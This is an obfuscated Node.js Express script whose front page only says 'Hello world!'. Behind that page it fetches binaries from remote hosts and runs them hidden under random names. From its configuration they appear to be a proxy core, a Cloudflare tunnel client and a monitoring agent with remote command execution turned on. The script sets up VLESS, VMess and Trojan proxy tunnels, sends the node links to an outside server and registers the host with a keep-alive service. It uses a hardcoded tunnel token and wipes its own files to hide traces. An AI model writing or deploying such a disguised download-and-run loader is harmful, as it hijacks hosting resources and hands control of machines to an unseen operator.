const _0x38dcf8=_0x4d31;(function(_0x4515b5,_0x484f43){const _0x320c80=_0x4d31,_0x1b6cc0=_0x4515b5();while(!![]){try{const _0x8d1ae=-parseInt(_0x320c80(0x12c))/0x1+parseInt(_0x320c80(0x137))/0x2*(parseInt(_0x320c80(0xde))/0x3)+parseInt(_0x320c80(0x14e))/0x4+parseInt(_0x320c80(0x136))/0x5+parseInt(_0x320c80(0x11e))/0x6+-parseInt(_0x320c80(0xa5))/0x7*(-parseInt(_0x320c80(0x9f))/0x8)+-parseInt(_0x320c80(0xa9))/0x9;if(_0x8d1ae===_0x484f43)break;else _0x1b6cc0['push'](_0x1b6cc0['shift']());}catch(_0xf3a1b5){_0x1b6cc0['push'](_0x1b6cc0['shift']());}}}(_0x4363,0x8015b));const express=require(_0x38dcf8(0xca)),app=express(),axios=require(_0x38dcf8(0xee)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x38dcf8(0x13d)),exec=promisify(require(_0x38dcf8(0xe3))[_0x38dcf8(0xe8)]),{execSync}=require(_0x38dcf8(0xe3)),UPLOAD_URL=process[_0x38dcf8(0x106)][_0x38dcf8(0xb5)]||'',PROJECT_URL=process[_0x38dcf8(0x106)][_0x38dcf8(0xfe)]||'',AUTO_ACCESS=process[_0x38dcf8(0x106)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x38dcf8(0x106)]['FILE_PATH']||'./tmp',SUB_PATH=process['env'][_0x38dcf8(0xa6)]||'sub',PORT=process[_0x38dcf8(0x106)]['SERVER_PORT']||process['env'][_0x38dcf8(0xa1)]||0xbb8,UUID=process[_0x38dcf8(0x106)][_0x38dcf8(0xc2)]||_0x38dcf8(0x147),NEZHA_SERVER=process[_0x38dcf8(0x106)][_0x38dcf8(0x131)]||'',NEZHA_PORT=process[_0x38dcf8(0x106)][_0x38dcf8(0x156)]||'',NEZHA_KEY=process[_0x38dcf8(0x106)][_0x38dcf8(0x157)]||'',ARGO_DOMAIN=process[_0x38dcf8(0x106)][_0x38dcf8(0x14a)]||_0x38dcf8(0x152),ARGO_AUTH=process['env'][_0x38dcf8(0x13e)]||_0x38dcf8(0xb7),ARGO_PORT=process['env'][_0x38dcf8(0x116)]||0x1f41,CFIP=process[_0x38dcf8(0x106)]['CFIP']||_0x38dcf8(0x14f),CFPORT=process['env'][_0x38dcf8(0xc1)]||0x1bb,NAME=process[_0x38dcf8(0x106)][_0x38dcf8(0x11d)]||'';!fs[_0x38dcf8(0xe5)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console['log'](FILE_PATH+_0x38dcf8(0x153))):console[_0x38dcf8(0x14c)](FILE_PATH+_0x38dcf8(0xc4));function generateRandomName(){const _0x8e56c0=_0x38dcf8,_0x56f3d3=_0x8e56c0(0x128);let _0x4f6e9e='';for(let _0x22d4cd=0x0;_0x22d4cd<0x6;_0x22d4cd++){_0x4f6e9e+=_0x56f3d3[_0x8e56c0(0x123)](Math[_0x8e56c0(0x15f)](Math[_0x8e56c0(0x10f)]()*_0x56f3d3['length']));}return _0x4f6e9e;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();function _0x4363(){const _0x42fa8e=['\x0a\x20\x20credentials-file:\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','block','693165qMAMxT','66712zRnTCo','amd','https://amd64.ssss.nyc.mn/v1','none','https://arm64.ssss.nyc.mn/agent','npm\x20running\x20error:\x20','util','ARGO_AUTH','close','match','\x0a\x20\x20\x20\x20','finish','?encryption=none&security=tls&sni=','127.0.0.1','https://arm64.ssss.nyc.mn/bot','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','bc97f674-c578-4940-9234-0a1da46041b9','/vless-argo','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','ARGO_DOMAIN','arm64','log','basename','1016304nSNVAq','saas.sin.fan','/api/add-nodes','post','clawrunsg.xiangyu-group.com.cn','\x20is\x20created','/config.json\x20>/dev/null\x202>&1\x20&','App\x20is\x20running','NEZHA_PORT','NEZHA_KEY','/trojan-argo','unlinkSync','clear','xtls-rprx-vision','https+local://8.8.8.8/dns-query','/vmess-argo?ed=2560','/api/delete-nodes','floor','substring','win32','&path=%2Fvless-argo%3Fed%3D2560#','718456OmFuoA','false','PORT','?security=tls&sni=','&fp=firefox&type=ws&host=','readdirSync','21HuWeVN','SUB_PATH','\x20-p\x20','\x20is\x20running','9758331vItbTe','blackhole','arch','createWriteStream','catch','Content-Type','data','rm\x20-rf\x20','nohup\x20','https://amd64.ssss.nyc.mn/bot','web\x20running\x20error:\x20','/api/add-subscriptions','UPLOAD_URL','Error\x20in\x20startserver:','eyJhIjoiODMzODQxZDFjYzE3MzEyYjZmZDkwNjBiZjdjNDY5MmMiLCJ0IjoiMzBhNDU5OGQtYzU1NC00MGZmLThiMDEtODc3YTg1NTVhZWI1IiwicyI6Ik5tSmlObVl3T0RFdE16WXpPQzAwTm1VekxXSTROR1F0TUROak5tRXhNREkxWkRNMyJ9','2087','listen','\x20-c\x20\x22','del\x20/f\x20/q\x20','Add\x20automatic\x20access\x20task\x20faild:\x20','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','https://arm64.ssss.nyc.mn/v1','https://oooo.serv00.net/add-url','status','CFPORT','UUID','all','\x20already\x20exists','tunnel.yml','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','NEZHA\x20variable\x20is\x20empty,skip\x20running','includes','/vmess-argo','express','Unhandled\x20error\x20in\x20startserver:','boot.log','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','send','\x20failed:\x20','length','trojan','Error\x20downloading\x20files:','unshift','automatic\x20access\x20task\x20added\x20successfully','\x0a\x20\x20\x0avmess://','test','join','\x0a\x20\x20tunnel:\x20','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','php\x20running\x20error:\x20','tls','Download\x20','Empowerment\x20failed\x20for\x20','57sDsYkP','\x20>/dev/null\x202>&1','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','platform','child_process','vless','existsSync','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','/dev/null','exec','utf-8','http','2083','quic','writeFileSync','axios','\x20>/dev/null\x202>&1\x20&','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','from','taskkill\x20/f\x20/im\x20','firefox','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','2053','stringify','https://arm64.ssss.nyc.mn/web','--tls','vmess','Error\x20reading\x20boot.log:','push','map','Nodes\x20uploaded\x20successfully','PROJECT_URL','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','config.yaml','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','pipe','application/json','stream','443','env','\x20>\x20nul\x202>&1','error','8443','tcp','\x20-s\x20','tunnel.json','base64','Error\x20executing\x20command:\x20','random','forEach','message','arm','readFileSync','\x0a\x20\x20\x0atrojan://','get','ARGO_PORT','filter','set','/sub.txt\x20saved\x20successfully','text/plain;\x20charset=utf-8','pop','Subscription\x20uploaded\x20successfully','NAME','5895792IGMQNL','Hello\x20world!','Empowerment\x20success\x20for\x20','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','then','charAt','toString','fileName','http\x20server\x20is\x20running\x20on\x20port:','direct','abcdefghijklmnopqrstuvwxyz','/tunnel.yml\x20run','split','response','669632mDQjOt','TunnelSecret','mkdirSync','aarch64','2096','NEZHA_SERVER','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'];_0x4363=function(){return _0x42fa8e;};return _0x4363();}let npmPath=path[_0x38dcf8(0xd7)](FILE_PATH,npmName),phpPath=path[_0x38dcf8(0xd7)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x38dcf8(0xd7)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,'sub.txt'),listPath=path[_0x38dcf8(0xd7)](FILE_PATH,'list.txt'),bootLogPath=path[_0x38dcf8(0xd7)](FILE_PATH,_0x38dcf8(0xcc)),configPath=path[_0x38dcf8(0xd7)](FILE_PATH,'config.json');function deleteNodes(){const _0x3931b3=_0x38dcf8;try{if(!UPLOAD_URL)return;if(!fs[_0x3931b3(0xe5)](subPath))return;let _0x27faff;try{_0x27faff=fs[_0x3931b3(0x113)](subPath,_0x3931b3(0xe9));}catch{return null;}const _0x519817=Buffer['from'](_0x27faff,_0x3931b3(0x10d))[_0x3931b3(0x124)](_0x3931b3(0xe9)),_0x4e58b4=_0x519817[_0x3931b3(0x12a)]('\x0a')[_0x3931b3(0x117)](_0x301b2b=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x3931b3(0xd6)](_0x301b2b));if(_0x4e58b4[_0x3931b3(0xd0)]===0x0)return;return axios['post'](UPLOAD_URL+_0x3931b3(0x15e),JSON['stringify']({'nodes':_0x4e58b4}),{'headers':{'Content-Type':_0x3931b3(0x103)}})['catch'](_0x313a9b=>{return null;}),null;}catch(_0x3df41c){return null;}}function cleanupOldFiles(){const _0x15a5a0=_0x38dcf8;try{const _0x10c794=fs[_0x15a5a0(0xa4)](FILE_PATH);_0x10c794[_0x15a5a0(0x110)](_0x33a220=>{const _0x1c91fb=_0x15a5a0,_0x52b880=path[_0x1c91fb(0xd7)](FILE_PATH,_0x33a220);try{const _0x24c625=fs['statSync'](_0x52b880);_0x24c625['isFile']()&&fs[_0x1c91fb(0x159)](_0x52b880);}catch(_0x5ed75d){}});}catch(_0x49e45e){}}function _0x4d31(_0x4f0eba,_0x481cde){_0x4f0eba=_0x4f0eba-0x9d;const _0x4363b2=_0x4363();let _0x4d3158=_0x4363b2[_0x4f0eba];return _0x4d3158;}app['get']('/',function(_0x4d8e98,_0x150268){const _0x597b9a=_0x38dcf8;_0x150268[_0x597b9a(0xce)](_0x597b9a(0x11f));});async function generateConfig(){const _0x19693d=_0x38dcf8,_0x5710c8={'log':{'access':'/dev/null','error':_0x19693d(0xe7),'loglevel':_0x19693d(0x13a)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x19693d(0x15b)}],'decryption':_0x19693d(0x13a),'fallbacks':[{'dest':0xbb9},{'path':_0x19693d(0x148),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x19693d(0x144),'protocol':_0x19693d(0xe4),'settings':{'clients':[{'id':UUID}],'decryption':_0x19693d(0x13a)},'streamSettings':{'network':_0x19693d(0x10a),'security':_0x19693d(0x13a)}},{'port':0xbba,'listen':_0x19693d(0x144),'protocol':_0x19693d(0xe4),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x19693d(0x13a)},'streamSettings':{'network':'ws','security':_0x19693d(0x13a),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x19693d(0xea),'tls',_0x19693d(0xec)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x19693d(0x144),'protocol':_0x19693d(0xf9),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x19693d(0xc9)}},'sniffing':{'enabled':!![],'destOverride':[_0x19693d(0xea),'tls',_0x19693d(0xec)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x19693d(0x144),'protocol':_0x19693d(0xd1),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x19693d(0x13a),'wsSettings':{'path':_0x19693d(0x158)}},'sniffing':{'enabled':!![],'destOverride':[_0x19693d(0xea),'tls',_0x19693d(0xec)],'metadataOnly':![]}}],'dns':{'servers':[_0x19693d(0x15c)]},'outbounds':[{'protocol':'freedom','tag':_0x19693d(0x127)},{'protocol':_0x19693d(0xaa),'tag':_0x19693d(0x135)}]};fs['writeFileSync'](path[_0x19693d(0xd7)](FILE_PATH,'config.json'),JSON[_0x19693d(0xf6)](_0x5710c8,null,0x2));}function getSystemArchitecture(){const _0xa2d6f4=_0x38dcf8,_0x8d44aa=os[_0xa2d6f4(0xab)]();return _0x8d44aa===_0xa2d6f4(0x112)||_0x8d44aa===_0xa2d6f4(0x14b)||_0x8d44aa===_0xa2d6f4(0x12f)?'arm':_0xa2d6f4(0x138);}function downloadFile(_0x5abb98,_0x16cce2,_0x2254ce){const _0x5da6ed=_0x38dcf8,_0x47c6ab=_0x5abb98;!fs[_0x5da6ed(0xe5)](FILE_PATH)&&fs[_0x5da6ed(0x12e)](FILE_PATH,{'recursive':!![]});const _0x36db05=fs[_0x5da6ed(0xac)](_0x47c6ab);axios({'method':_0x5da6ed(0x115),'url':_0x16cce2,'responseType':_0x5da6ed(0x104)})[_0x5da6ed(0x122)](_0x33ddae=>{const _0x5f1470=_0x5da6ed;_0x33ddae[_0x5f1470(0xaf)][_0x5f1470(0x102)](_0x36db05),_0x36db05['on'](_0x5f1470(0x142),()=>{const _0x3ba4fc=_0x5f1470;_0x36db05[_0x3ba4fc(0x13f)](),console[_0x3ba4fc(0x14c)](_0x3ba4fc(0xdc)+path[_0x3ba4fc(0x14d)](_0x47c6ab)+'\x20successfully'),_0x2254ce(null,_0x47c6ab);}),_0x36db05['on'](_0x5f1470(0x108),_0x3bf91b=>{const _0x22c48d=_0x5f1470;fs['unlink'](_0x47c6ab,()=>{});const _0x3a8da4=_0x22c48d(0xdc)+path[_0x22c48d(0x14d)](_0x47c6ab)+_0x22c48d(0xcf)+_0x3bf91b[_0x22c48d(0x111)];console[_0x22c48d(0x108)](_0x3a8da4),_0x2254ce(_0x3a8da4);});})[_0x5da6ed(0xad)](_0x4c9cbb=>{const _0xf371e8=_0x5da6ed,_0x9e4e45=_0xf371e8(0xdc)+path[_0xf371e8(0x14d)](_0x47c6ab)+_0xf371e8(0xcf)+_0x4c9cbb[_0xf371e8(0x111)];console[_0xf371e8(0x108)](_0x9e4e45),_0x2254ce(_0x9e4e45);});}async function downloadFilesAndRun(){const _0x1e1643=_0x38dcf8,_0x38812c=getSystemArchitecture(),_0x44880e=getFilesForArchitecture(_0x38812c);if(_0x44880e[_0x1e1643(0xd0)]===0x0){console[_0x1e1643(0x14c)](_0x1e1643(0xc6));return;}const _0x11ee39=_0x44880e[_0x1e1643(0xfc)](_0x13287b=>{return new Promise((_0x22f5ec,_0x10549a)=>{const _0x1ca12b=_0x4d31;downloadFile(_0x13287b[_0x1ca12b(0x125)],_0x13287b['fileUrl'],(_0x4ef45d,_0x5d356d)=>{_0x4ef45d?_0x10549a(_0x4ef45d):_0x22f5ec(_0x5d356d);});});});try{await Promise[_0x1e1643(0xc3)](_0x11ee39);}catch(_0x384cc2){console['error'](_0x1e1643(0xd2),_0x384cc2);return;}function _0x178c88(_0x244f69){const _0x3a91a6=0x1fd;_0x244f69['forEach'](_0x3fbab9=>{const _0x1fe1bf=_0x4d31;fs[_0x1fe1bf(0xe5)](_0x3fbab9)&&fs['chmod'](_0x3fbab9,_0x3a91a6,_0xda8601=>{const _0xfae4b=_0x1fe1bf;_0xda8601?console['error'](_0xfae4b(0xdd)+_0x3fbab9+':\x20'+_0xda8601):console['log'](_0xfae4b(0x120)+_0x3fbab9+':\x20'+_0x3a91a6[_0xfae4b(0x124)](0x8));});});}const _0x5d95df=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x178c88(_0x5d95df);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1cb6ff=NEZHA_SERVER[_0x1e1643(0xc8)](':')?NEZHA_SERVER[_0x1e1643(0x12a)](':')[_0x1e1643(0x11b)]():'',_0x47ad7d=new Set([_0x1e1643(0x105),_0x1e1643(0x109),'2096',_0x1e1643(0xb8),_0x1e1643(0xeb),_0x1e1643(0xf5)]),_0x2a580c=_0x47ad7d['has'](_0x1cb6ff)?'true':_0x1e1643(0xa0),_0x238234='\x0aclient_secret:\x20'+NEZHA_KEY+_0x1e1643(0x132)+NEZHA_SERVER+_0x1e1643(0xbd)+_0x2a580c+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x1e1643(0xed)](path[_0x1e1643(0xd7)](FILE_PATH,_0x1e1643(0x100)),_0x238234);const _0x4888cf=_0x1e1643(0xb1)+phpPath+_0x1e1643(0xba)+FILE_PATH+_0x1e1643(0xe0);try{await exec(_0x4888cf),console[_0x1e1643(0x14c)](phpName+_0x1e1643(0xa8)),await new Promise(_0x3d146c=>setTimeout(_0x3d146c,0x3e8));}catch(_0x3ca3f3){console[_0x1e1643(0x108)](_0x1e1643(0xda)+_0x3ca3f3);}}else{let _0x4e6100='';const _0x466c25=[_0x1e1643(0x105),_0x1e1643(0x109),_0x1e1643(0x130),_0x1e1643(0xb8),'2083',_0x1e1643(0xf5)];_0x466c25['includes'](NEZHA_PORT)&&(_0x4e6100=_0x1e1643(0xf8));const _0x41bc80=_0x1e1643(0xb1)+npmPath+_0x1e1643(0x10b)+NEZHA_SERVER+':'+NEZHA_PORT+_0x1e1643(0xa7)+NEZHA_KEY+'\x20'+_0x4e6100+_0x1e1643(0xf4);try{await exec(_0x41bc80),console[_0x1e1643(0x14c)](npmName+_0x1e1643(0xa8)),await new Promise(_0x3e8fe9=>setTimeout(_0x3e8fe9,0x3e8));}catch(_0x176401){console[_0x1e1643(0x108)](_0x1e1643(0x13c)+_0x176401);}}}else console[_0x1e1643(0x14c)](_0x1e1643(0xc7));const _0x3cb83e='nohup\x20'+webPath+'\x20-c\x20'+FILE_PATH+_0x1e1643(0x154);try{await exec(_0x3cb83e),console['log'](webName+_0x1e1643(0xa8)),await new Promise(_0x35b720=>setTimeout(_0x35b720,0x3e8));}catch(_0xbdfc9f){console['error'](_0x1e1643(0xb3)+_0xbdfc9f);}if(fs[_0x1e1643(0xe5)](botPath)){let _0x3cca83;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x3cca83=_0x1e1643(0x134)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x3cca83='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x1e1643(0x129):_0x3cca83=_0x1e1643(0xe6)+FILE_PATH+_0x1e1643(0xcd)+ARGO_PORT;try{await exec(_0x1e1643(0xb1)+botPath+'\x20'+_0x3cca83+'\x20>/dev/null\x202>&1\x20&'),console['log'](botName+_0x1e1643(0xa8)),await new Promise(_0x29304d=>setTimeout(_0x29304d,0x7d0));}catch(_0x41b413){console[_0x1e1643(0x108)](_0x1e1643(0x10e)+_0x41b413);}}await new Promise(_0x4d8ff6=>setTimeout(_0x4d8ff6,0x1388));}function getFilesForArchitecture(_0x275302){const _0x1b552d=_0x38dcf8;let _0xe4859;_0x275302===_0x1b552d(0x112)?_0xe4859=[{'fileName':webPath,'fileUrl':_0x1b552d(0xf7)},{'fileName':botPath,'fileUrl':_0x1b552d(0x145)}]:_0xe4859=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x1b552d(0xb2)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0xe27c54=_0x275302===_0x1b552d(0x112)?_0x1b552d(0x13b):'https://amd64.ssss.nyc.mn/agent';_0xe4859['unshift']({'fileName':npmPath,'fileUrl':_0xe27c54});}else{const _0x4eb86d=_0x275302===_0x1b552d(0x112)?_0x1b552d(0xbe):_0x1b552d(0x139);_0xe4859[_0x1b552d(0xd3)]({'fileName':phpPath,'fileUrl':_0x4eb86d});}}return _0xe4859;}function argoType(){const _0x5bc4e8=_0x38dcf8;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0x5bc4e8(0xf0));return;}if(ARGO_AUTH[_0x5bc4e8(0xc8)](_0x5bc4e8(0x12d))){fs[_0x5bc4e8(0xed)](path[_0x5bc4e8(0xd7)](FILE_PATH,_0x5bc4e8(0x10c)),ARGO_AUTH);const _0xb7d33f=_0x5bc4e8(0xd8)+ARGO_AUTH[_0x5bc4e8(0x12a)]('\x22')[0xb]+_0x5bc4e8(0x133)+path[_0x5bc4e8(0xd7)](FILE_PATH,_0x5bc4e8(0x10c))+_0x5bc4e8(0x121)+ARGO_DOMAIN+_0x5bc4e8(0x149)+ARGO_PORT+_0x5bc4e8(0xff);fs[_0x5bc4e8(0xed)](path[_0x5bc4e8(0xd7)](FILE_PATH,_0x5bc4e8(0xc5)),_0xb7d33f);}else console[_0x5bc4e8(0x14c)](_0x5bc4e8(0xd9));}argoType();async function extractDomains(){const _0x2a9135=_0x38dcf8;let _0x4b7a53;if(ARGO_AUTH&&ARGO_DOMAIN)_0x4b7a53=ARGO_DOMAIN,console['log']('ARGO_DOMAIN:',_0x4b7a53),await _0x1b2402(_0x4b7a53);else try{const _0x4b62dc=fs[_0x2a9135(0x113)](path['join'](FILE_PATH,_0x2a9135(0xcc)),_0x2a9135(0xe9)),_0x3f0cf8=_0x4b62dc[_0x2a9135(0x12a)]('\x0a'),_0x24fca0=[];_0x3f0cf8[_0x2a9135(0x110)](_0x459f36=>{const _0x560ef4=_0x2a9135,_0x34f0bf=_0x459f36[_0x560ef4(0x140)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x34f0bf){const _0x36f2c2=_0x34f0bf[0x1];_0x24fca0[_0x560ef4(0xfb)](_0x36f2c2);}});if(_0x24fca0[_0x2a9135(0xd0)]>0x0)_0x4b7a53=_0x24fca0[0x0],console['log']('ArgoDomain:',_0x4b7a53),await _0x1b2402(_0x4b7a53);else{console['log'](_0x2a9135(0xe1)),fs[_0x2a9135(0x159)](path[_0x2a9135(0xd7)](FILE_PATH,_0x2a9135(0xcc)));async function _0x472dd8(){const _0x499174=_0x2a9135;try{process[_0x499174(0xe2)]===_0x499174(0x9d)?await exec(_0x499174(0xf2)+botName+'.exe\x20>\x20nul\x202>&1'):await exec('pkill\x20-f\x20\x22['+botName['charAt'](0x0)+']'+botName[_0x499174(0x160)](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x49a2f6){}}_0x472dd8(),await new Promise(_0x60d3bf=>setTimeout(_0x60d3bf,0xbb8));const _0x5ce73c=_0x2a9135(0xe6)+FILE_PATH+_0x2a9135(0xcd)+ARGO_PORT;try{await exec(_0x2a9135(0xb1)+botPath+'\x20'+_0x5ce73c+_0x2a9135(0xef)),console[_0x2a9135(0x14c)](botName+_0x2a9135(0xa8)),await new Promise(_0x2f1b8b=>setTimeout(_0x2f1b8b,0xbb8)),await extractDomains();}catch(_0x35c41c){console[_0x2a9135(0x108)](_0x2a9135(0x10e)+_0x35c41c);}}}catch(_0x399192){console['error'](_0x2a9135(0xfa),_0x399192);}async function _0x1b2402(_0x428e0b){const _0x14af13=_0x2a9135,_0x3fd118=execSync(_0x14af13(0x101),{'encoding':_0x14af13(0xe9)}),_0x6bb62b=_0x3fd118['trim'](),_0x135a06=NAME?NAME+'-'+_0x6bb62b:_0x6bb62b;return new Promise(_0x35a2c4=>{setTimeout(()=>{const _0x652181=_0x4d31,_0x55a16c={'v':'2','ps':''+_0x135a06,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x652181(0x13a),'net':'ws','type':'none','host':_0x428e0b,'path':_0x652181(0x15d),'tls':_0x652181(0xdb),'sni':_0x428e0b,'alpn':'','fp':_0x652181(0xf3)},_0x584bca='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x652181(0x143)+_0x428e0b+_0x652181(0xa3)+_0x428e0b+_0x652181(0x9e)+_0x135a06+_0x652181(0xd5)+Buffer['from'](JSON[_0x652181(0xf6)](_0x55a16c))[_0x652181(0x124)]('base64')+_0x652181(0x114)+UUID+'@'+CFIP+':'+CFPORT+_0x652181(0xa2)+_0x428e0b+_0x652181(0xa3)+_0x428e0b+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x135a06+_0x652181(0x141);console[_0x652181(0x14c)](Buffer[_0x652181(0xf1)](_0x584bca)[_0x652181(0x124)](_0x652181(0x10d))),fs['writeFileSync'](subPath,Buffer['from'](_0x584bca)[_0x652181(0x124)](_0x652181(0x10d))),console[_0x652181(0x14c)](FILE_PATH+_0x652181(0x119)),uploadNodes(),app[_0x652181(0x115)]('/'+SUB_PATH,(_0x27738c,_0x5d78a9)=>{const _0x3ec6ca=_0x652181,_0x860d62=Buffer[_0x3ec6ca(0xf1)](_0x584bca)['toString'](_0x3ec6ca(0x10d));_0x5d78a9[_0x3ec6ca(0x118)](_0x3ec6ca(0xae),_0x3ec6ca(0x11a)),_0x5d78a9[_0x3ec6ca(0xce)](_0x860d62);}),_0x35a2c4(_0x584bca);},0x7d0);});}}async function uploadNodes(){const _0x17a753=_0x38dcf8;if(UPLOAD_URL&&PROJECT_URL){const _0x4b4114=PROJECT_URL+'/'+SUB_PATH,_0x50130f={'subscription':[_0x4b4114]};try{const _0x20518a=await axios[_0x17a753(0x151)](UPLOAD_URL+_0x17a753(0xb4),_0x50130f,{'headers':{'Content-Type':_0x17a753(0x103)}});return _0x20518a&&_0x20518a[_0x17a753(0xc0)]===0xc8?(console[_0x17a753(0x14c)](_0x17a753(0x11c)),_0x20518a):null;}catch(_0x33103f){if(_0x33103f[_0x17a753(0x12b)]){if(_0x33103f[_0x17a753(0x12b)][_0x17a753(0xc0)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x17a753(0xe5)](listPath))return;const _0xa4da60=fs[_0x17a753(0x113)](listPath,_0x17a753(0xe9)),_0x447c59=_0xa4da60[_0x17a753(0x12a)]('\x0a')[_0x17a753(0x117)](_0x19a26b=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x17a753(0xd6)](_0x19a26b));if(_0x447c59[_0x17a753(0xd0)]===0x0)return;const _0x386412=JSON[_0x17a753(0xf6)]({'nodes':_0x447c59});try{const _0x3a0034=await axios[_0x17a753(0x151)](UPLOAD_URL+_0x17a753(0x150),_0x386412,{'headers':{'Content-Type':'application/json'}});return _0x3a0034&&_0x3a0034['status']===0xc8?(console[_0x17a753(0x14c)](_0x17a753(0xfd)),_0x3a0034):null;}catch(_0x3fe743){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x3b2099=_0x4d31,_0x3e3894=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x3e3894[_0x3b2099(0xfb)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x3e3894[_0x3b2099(0xfb)](phpPath);process[_0x3b2099(0xe2)]===_0x3b2099(0x9d)?exec(_0x3b2099(0xbb)+_0x3e3894[_0x3b2099(0xd7)]('\x20')+_0x3b2099(0x107),_0x4e356a=>{const _0x29d089=_0x3b2099;console[_0x29d089(0x15a)](),console[_0x29d089(0x14c)](_0x29d089(0x155)),console[_0x29d089(0x14c)](_0x29d089(0x146));}):exec(_0x3b2099(0xb0)+_0x3e3894[_0x3b2099(0xd7)]('\x20')+_0x3b2099(0xdf),_0x112fe5=>{const _0x1b1cfa=_0x3b2099;console['clear'](),console[_0x1b1cfa(0x14c)](_0x1b1cfa(0x155)),console[_0x1b1cfa(0x14c)](_0x1b1cfa(0x146));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x2e8aaf=_0x38dcf8;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x2e8aaf(0x14c)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0xaf3909=await axios[_0x2e8aaf(0x151)](_0x2e8aaf(0xbf),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x2e8aaf(0x103)}});return console[_0x2e8aaf(0x14c)](_0x2e8aaf(0xd4)),_0xaf3909;}catch(_0x29f88e){return console[_0x2e8aaf(0x108)](_0x2e8aaf(0xbc)+_0x29f88e[_0x2e8aaf(0x111)]),null;}}async function startserver(){const _0x574530=_0x38dcf8;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x49f2d6){console['error'](_0x574530(0xb6),_0x49f2d6);}}startserver()[_0x38dcf8(0xad)](_0x5f11e9=>{const _0x223cb7=_0x38dcf8;console[_0x223cb7(0x108)](_0x223cb7(0xcb),_0x5f11e9);}),app[_0x38dcf8(0xb9)](PORT,()=>console[_0x38dcf8(0x14c)](_0x38dcf8(0x126)+PORT+'!'));
